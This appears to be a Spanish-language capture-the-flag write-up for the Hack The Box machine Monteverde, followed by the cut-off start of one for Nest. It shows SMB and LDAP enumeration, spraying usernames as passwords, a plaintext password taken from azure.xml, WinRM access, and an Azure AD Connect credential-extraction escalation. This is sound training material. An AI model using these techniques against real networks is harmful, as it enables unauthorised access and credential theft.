13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  # Nmap 7.80 scan initiated Sat Jan 18 18:57:43 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.172 Nmap scan report for 10.10.10.172 Host is up (0.26s latency). Not shown: 65517 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-01-19 01:11:44Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49670/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49702/tcp open msrpc Microsoft Windows RPC 49775/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=1/18%Time=5E23AA58%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 10m36s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-01-19T01:14:10 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jan 18 19:05:11 2020 -- 1 IP address (1 host up) scanned in 448.85 seconds   ENUM4LINUX Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba y ldap con enum4linux, enumerando los usuarios dentro de la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187  Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jan 18 19:15:47 2020 [ ... REDACTED ... ] =========================================== | Getting domain SID for 10.10.10.172 | =========================================== Domain Name: MEGABANK Domain Sid: S-1-5-21-391775091-850290835-3566037492 [+] Host is part of a domain (not a workgroup) ====================================== | OS information on 10.10.10.172 | ====================================== [+] Got OS info for 10.10.10.172 from smbclient: [+] Got OS info for 10.10.10.172 from srvinfo: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED ============================= | Users on 10.10.10.172 | ============================= index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2\tName: AAD_987d7f2f57d2\tDesc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE. index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos\tName: Dimitris Galanos\tDesc: (null) index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest\tName: (null)\tDesc: Built-in account for guest access to the computer/domain index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope\tName: Mike Hope\tDesc: (null) index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary\tName: Ray O\u0026#39;Leary\tDesc: (null) index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs\tName: SABatchJobs\tDesc: (null) index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan\tName: Sally Morgan\tDesc: (null) index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata\tName: svc-ata\tDesc: (null) index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec\tName: svc-bexec\tDesc: (null) index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp\tName: svc-netapp\tDesc: (null) user:[Guest] rid:[0x1f5] user:[AAD_987d7f2f57d2] rid:[0x450] user:[mhope] rid:[0x641] user:[SABatchJobs] rid:[0xa2a] user:[svc-ata] rid:[0xa2b] user:[svc-bexec] rid:[0xa2c] user:[svc-netapp] rid:[0xa2d] user:[dgalanos] rid:[0xa35] user:[roleary] rid:[0xa36] user:[smorgan] rid:[0xa37] ========================================= | Share Enumeration on 10.10.10.172 | ========================================= Sharename Type Comment --------- ---- ------- SMB1 disabled -- no workgroup available [+] Attempting to map shares on 10.10.10.172 ==================================================== | Password Policy Information for 10.10.10.172 | ==================================================== [+] Attaching to 10.10.10.172 using a NULL share [+] Trying protocol 445/SMB... [+] Found domain(s): [+] MEGABANK [+] Builtin [+] Password Info for Domain: MEGABANK [+] Minimum password length: 7 [+] Password history length: 24 [+] Maximum password age: 41 days 23 hours 53 minutes [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: 1 day 4 minutes [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: Not Set [+] Retieved partial password policy with rpcclient: Password Complexity: Disabled Minimum Password Length: 7 ============================== | Groups on 10.10.10.172 | ============================== [+] Getting builtin groups: group:[Pre-Windows 2000 Compatible Access] rid:[0x22a] group:[Incoming Forest Trust Builders] rid:[0x22d] group:[Windows Authorization Access Group] rid:[0x230] group:[Terminal Server License Servers] rid:[0x231] group:[Users] rid:[0x221] group:[Guests] rid:[0x222] group:[Remote Desktop Users] rid:[0x22b] group:[Network Configuration Operators] rid:[0x22c] group:[Performance Monitor Users] rid:[0x22e] group:[Performance Log Users] rid:[0x22f] group:[Distributed COM Users] rid:[0x232] group:[IIS_IUSRS] rid:[0x238] group:[Cryptographic Operators] rid:[0x239] group:[Event Log Readers] rid:[0x23d] group:[Certificate Service DCOM Access] rid:[0x23e] group:[RDS Remote Access Servers] rid:[0x23f] group:[RDS Endpoint Servers] rid:[0x240] group:[RDS Management Servers] rid:[0x241] group:[Hyper-V Administrators] rid:[0x242] group:[Access Control Assistance Operators] rid:[0x243] group:[Remote Management Users] rid:[0x244] group:[Storage Replica Administrators] rid:[0x246] [+] Getting builtin group memberships: Group \u0026#39;IIS_IUSRS\u0026#39; (RID: 568) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Guests\u0026#39; (RID: 546) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Incoming Forest Trust Builders\u0026#39; (RID: 557) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE Group \u0026#39;Pre-Windows 2000 Compatible Access\u0026#39; (RID: 554) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Windows Authorization Access Group\u0026#39; (RID: 560) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Remote Management Users\u0026#39; (RID: 580) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Users\u0026#39; (RID: 545) has member: Couldn\u0026#39;t lookup SIDs [+] Getting local groups: group:[Cert Publishers] rid:[0x205] group:[RAS and IAS Servers] rid:[0x229] group:[Allowed RODC Password Replication Group] rid:[0x23b] group:[Denied RODC Password Replication Group] rid:[0x23c] group:[DnsAdmins] rid:[0x44d] group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f] group:[ADSyncAdmins] rid:[0x451] group:[ADSyncOperators] rid:[0x452] group:[ADSyncBrowse] rid:[0x453] group:[ADSyncPasswordSet] rid:[0x454] [+] Getting local group memberships: Group \u0026#39;ADSyncAdmins\u0026#39; (RID: 1105) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Denied RODC Password Replication Group\u0026#39; (RID: 572) has member: Couldn\u0026#39;t lookup SIDs [+] Getting domain groups: group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Group Policy Creator Owners] rid:[0x208] group:[Cloneable Domain Controllers] rid:[0x20a] group:[Protected Users] rid:[0x20d] group:[DnsUpdateProxy] rid:[0x44e] group:[Azure Admins] rid:[0xa29] group:[File Server Admins] rid:[0xa2e] group:[Call Recording Admins] rid:[0xa2f] group:[Reception] rid:[0xa30] group:[Operations] rid:[0xa31] group:[Trading] rid:[0xa32] group:[HelpDesk] rid:[0xa33] group:[Developers] rid:[0xa34] [+] Getting domain group memberships: Group \u0026#39;HelpDesk\u0026#39; (RID: 2611) has member: MEGABANK\\roleary Group \u0026#39;Trading\u0026#39; (RID: 2610) has member: MEGABANK\\dgalanos Group \u0026#39;Operations\u0026#39; (RID: 2609) has member: MEGABANK\\smorgan Group \u0026#39;Azure Admins\u0026#39; (RID: 2601) has member: MEGABANK\\Administrator Group \u0026#39;Azure Admins\u0026#39; (RID: 2601) has member: MEGABANK\\AAD_987d7f2f57d2 Group \u0026#39;Azure Admins\u0026#39; (RID: 2601) has member: MEGABANK\\mhope Group \u0026#39;Domain Guests\u0026#39; (RID: 514) has member: MEGABANK\\Guest Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\Administrator Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\krbtgt Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\AAD_987d7f2f57d2 Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\mhope Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\SABatchJobs Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\svc-ata Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\svc-bexec Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\svc-netapp Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\dgalanos Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\roleary Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\smorgan Group \u0026#39;Group Policy Creator Owners\u0026#39; (RID: 520) has member: MEGABANK\\Administrator [ ... REDACTED ... ]   Vemos varios usuarios de los cuales no logramos obtener informacion que nos pudiesen ayudar.\nSMBMAP Utilizamos la lista de usuarios junto con smbmap para verificar que alguno de ellos tenga permisos en alguno de los SHARENAMEs de la maquina utilizando el nombre de usuario como contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98  root@aoiri:~/htb/monteverde# while read USER; do echo $USER \u0026amp;\u0026amp; smbmap -H 10.10.10.172 -u $USER -p \u0026#34;$USER\u0026#34;; done \u0026lt; users.txt roleary [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 dgalanos [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 smorgan [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 AAD_987d7f2f57d2 [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 mhope [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 Guest [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 SABatchJobs [+] Finding open SMB ports.... [+] User SMB session established on 10.10.10.172... [+] IP: 10.10.10.172:445\tName: 10.10.10.172 Disk Permissions\tComment ---- -----------\t------- ADMIN$ NO ACCESS\tRemote Admin . dr--r--r-- 0 Fri Jan 3 06:43:36 2020\t. dr--r--r-- 0 Fri Jan 3 06:43:36 2020\t.. azure_uploads READ ONLY\tC$ NO ACCESS\tDefault share E$ NO ACCESS\tDefault share . fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tInitShutdown fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tlsass fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tntsvcs fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tscerpc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-3b4-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tepmapper fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-1ec-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tLSM_API_service fr--r--r-- 3 Sun Dec 31 17:57:56 1600\teventlog fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-488-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tatsvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-6a4-0 fr--r--r-- 4 Sun Dec 31 17:57:56 1600\twkssvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-294-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-294-1 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tRpcProxy\\49669 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\teddf3645116af5dd fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tRpcProxy\\593 fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tsrvsvc fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tspoolss fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-b54-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tnetdfs fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tvgauth-service fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-280-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tW32TIME_ALT fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tSQLLocal\\MSSQLSERVER fr--r--r-- 2 Sun Dec 31 17:57:56 1600\tsql\\query fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-ba0-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tCPFATP_6024_v4.0.30319 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132240333070920024.6024.DefaultAppDomain.miiserver fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tGoogleCrashServices\\S-1-5-18 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tGoogleCrashServices\\S-1-5-18-x64 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-bac-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132240367071490977.1628.DefaultAppDomain.wsmprovhost IPC$ READ ONLY\tRemote IPC . dr--r--r-- 0 Thu Jan 2 16:05:27 2020\t. dr--r--r-- 0 Thu Jan 2 16:05:27 2020\t.. NETLOGON READ ONLY\tLogon server share . dr--r--r-- 0 Thu Jan 2 16:05:27 2020\t. dr--r--r-- 0 Thu Jan 2 16:05:27 2020\t.. dr--r--r-- 0 Thu Jan 2 16:05:27 2020\tMEGABANK.LOCAL SYSVOL READ ONLY\tLogon server share . dr--r--r-- 0 Fri Jan 3 07:12:48 2020\t. dr--r--r-- 0 Fri Jan 3 07:12:48 2020\t.. dr--r--r-- 0 Fri Jan 3 07:15:23 2020\tdgalanos dr--r--r-- 0 Fri Jan 3 07:41:18 2020\tmhope dr--r--r-- 0 Fri Jan 3 07:14:56 2020\troleary dr--r--r-- 0 Fri Jan 3 07:14:28 2020\tsmorgan users$ READ ONLY\tsvc-ata [+] Finding open SMB ports.... svc-bexec [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172   Vemos que el usuario SABatchJobs tiene permisos de Lectura en azure_uploads y users$.\nUSER MHOPE Azure PSADPasswordCredential Utilizamos las credenciales para enumerar users$ con smbclient, encontramos un archivo de azure que contiene la contraseña en texto plano en un archivo de XML.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  root@aoiri:~/htb/monteverde# smbclient \\\\\\\\10.10.10.172\\\\users$ -U SABatchJobs Enter WORKGROUP\\SABatchJobs\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Fri Jan 3 07:12:48 2020 .. D 0 Fri Jan 3 07:12:48 2020 dgalanos D 0 Fri Jan 3 07:12:30 2020 mhope D 0 Fri Jan 3 07:41:18 2020 roleary D 0 Fri Jan 3 07:10:30 2020 smorgan D 0 Fri Jan 3 07:10:24 2020 524031 blocks of size 4096. 519955 blocks available smb: \\\u0026gt; cd mhope smb: \\mhope\\\u0026gt; dir . D 0 Fri Jan 3 07:41:18 2020 .. D 0 Fri Jan 3 07:41:18 2020 azure.xml AR 1212 Fri Jan 3 07:40:23 2020 524031 blocks of size 4096. 519955 blocks available smb: \\mhope\\\u0026gt; get azure.xml getting file \\mhope\\azure.xml of size 1212 as azure.xml (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec) smb: \\mhope\\\u0026gt; exit root@aoiri:~/htb/monteverde# cat azure.xml ��\u0026lt;Objs Version=\u0026#34;1.1.0.1\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/powershell/2004/04\u0026#34;\u0026gt; \u0026lt;Obj RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;T\u0026gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;DT N=\u0026#34;StartDate\u0026#34;\u0026gt;2020-01-03T05:35:00.7562298-08:00\u0026lt;/DT\u0026gt; \u0026lt;DT N=\u0026#34;EndDate\u0026#34;\u0026gt;2054-01-03T05:35:00.7562298-08:00\u0026lt;/DT\u0026gt; \u0026lt;G N=\u0026#34;KeyId\u0026#34;\u0026gt;00000000-0000-0000-0000-000000000000\u0026lt;/G\u0026gt; \u0026lt;S N=\u0026#34;Password\u0026#34;\u0026gt;4n0therD4y@n0th3r$\u0026lt;/S\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Objs\u0026gt;   1 2  Credenciales: mhope:4n0therD4y@n0th3r$   EvilWinRm Ya que el puerto de winrm esta abierto utilizamos las credenciales que tenemos junto con evilwinrm, obtenemos una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Utilizamos whoami /all para ver los permisos, grupos y privilegios que el usuario tiene.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  *Evil-WinRM* PS C:\\Users\\mhope\\Documents\u0026gt; whoami /all USER INFORMATION ---------------- User Name SID ============== ============================================ megabank\\mhope S-1-5-21-391775091-850290835-3566037492-1601 GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group MEGABANK\\Azure Admins Group S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled USER CLAIMS INFORMATION ----------------------- User claims unknown. Kerberos support for Dynamic Access Control on this device has been disabled. *Evil-WinRM* PS C:\\Users\\mhope\\Documents\u0026gt;   Vemos que mhope pertenece al grupo de Azure Admins, despues de investigar acerca de este grupo encontramos un post de XPN que explica como se puede obtener la contraseña y usario desde la base de datos del catalogo de ADSync de azure.\nAzureAd - RedTeam\nUtilizamos el script azuread_decrypt_msol que viene adjunto al post, modificandolo para que pueda hacer el query a la base de datos local.\n1  $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Data Source = localhost; Initial Catalog=ADSync; Trusted_Connection=True\u0026#34;   Utilizamos las credenciales en evil-winrm obtuvimos una shell y nuestra flag root.txt.\n","description":"Monteverde expone SMB y LDAP donde obtuvimos una lista de usuarios los cuales utilizamos como contraseña para enumerar SMB y obtener credenciales almacenadas que nos dieron acceso por WinRM. El usuario pertenece al grupo Azure Admins lo que permitio conectarnos a la base de datos y obtener credenciales para obtener acceso privilegiado.","id":79,"section":"posts","tags":["azureAD","enum4linux","smbmap","evil-winrm"],"title":"Hack The Box - Monteverde","uri":"https://sckull.github.io/posts/monteverde/"},{"content":"  Tras enumerar SAMBA encontramos credenciales para un segundo recurso donde descubrimos una contraseña encriptada y proyecto de Visual Studio, con este ultimo logramos desencriptar la contraseña. Con ello ingresamos a un nuevo recurso donde encontramos Alternative Data Streams en un ejecutable, dentro de este encontramos una contraseña que utilizamos en un servicio de reporteria, utilizamos DNSPY en un ejecutable para leer el codigo fuente lo que nos permitio conseguir la contraseña del administrador y obtener acceso privilegiado utilizando psexec de Impacket.\nInformacion de la Maquina    Nombre Nest      OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.178   Maker VbScrub    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[8, 5.8, 3.8, 6.2, 4.2], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[8, 7, 1, 9, 3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap, encontramos el puerto samba (445) y el puerto 2386 abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-29 04:56:39 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 4386/tcp on 10.10.10.178 Discovered open port 445/tcp on 10.10.10.178 # Nmap 7.80 scan initiated Tue Jan 28 22:23:24 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.178 Nmap scan report for 10.10.10.178 Host is up (0.34s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 4386/tcp open unknown | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: | Reporting Service V1.2 | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: | Reporting Service V1.2 | Unrecognised command | Help: | Reporting Service V1.2 | This service allows users to run queries against databases using the legacy HQK format | AVAILABLE COMMANDS --- | LIST | SETDIR \u0026lt;Directory_Name\u0026gt; | RUNQUERY \u0026lt;Query_ID\u0026gt; | DEBUG \u0026lt;Password\u0026gt; |_ HELP \u0026lt;Command\u0026gt; ... [snip] ... Host script results: |_clock-skew: 1m15s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-01-29T04:29:38 |_ start_date: 2020-01-29T03:11:05 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jan 28 22:29:02 2020 -- 1 IP address (1 host up) scanned in 338.05 seconds   SMBCLIENT Listamos los SHARENAMES de la maquina, vemos que existe Data, Secure$ y Users, en los cuales tenemos acceso.\n1 2 3 4 5 6 7 8 9 10 11 12  root@aoiri:~/htb/nest# smbclient -L 10.10.10.178 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share Data Disk IPC$ IPC Remote IPC Secure$ Disk Users Disk SMB1 disabled -- no workgroup available   Utilizamos el SHARENAME Data con un usuario \u0026lsquo;anonimo\u0026rsquo; y sin contraseña para enumerar los archivos, encontramos dentro de Shared dos archivos de texto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  root@aoiri:~/htb/nest# smbclient \\\\\\\\10.10.10.178\\\\Data Enter WORKGROUP\\root\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Wed Aug 7 16:53:46 2019 .. D 0 Wed Aug 7 16:53:46 2019 IT D 0 Wed Aug 7 16:58:07 2019 Production D 0 Mon Aug 5 15:53:38 2019 Reports D 0 Mon Aug 5 15:53:44 2019 Shared D 0 Wed Aug 7 13:07:51 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\\u0026gt; cd IT smb: \\IT\\\u0026gt; dir NT_STATUS_ACCESS_DENIED listing \\IT\\* smb: \\IT\\\u0026gt; cd .. smb: \\\u0026gt; cd Production dsmb: \\Production\\\u0026gt; dir NT_STATUS_ACCESS_DENIED listing \\Production\\* smb: \\Production\\\u0026gt; cd .. smb: \\\u0026gt; cd Reports smb: \\Reports\\\u0026gt; dir NT_STATUS_ACCESS_DENIED listing \\Reports\\* smb: \\Reports\\\u0026gt; cd .. smb: \\\u0026gt; cd Shared dsmb: \\Shared\\\u0026gt; dir . D 0 Wed Aug 7 13:07:51 2019 .. D 0 Wed Aug 7 13:07:51 2019 Maintenance D 0 Wed Aug 7 13:07:32 2019 Templates D 0 Wed Aug 7 13:08:07 2019 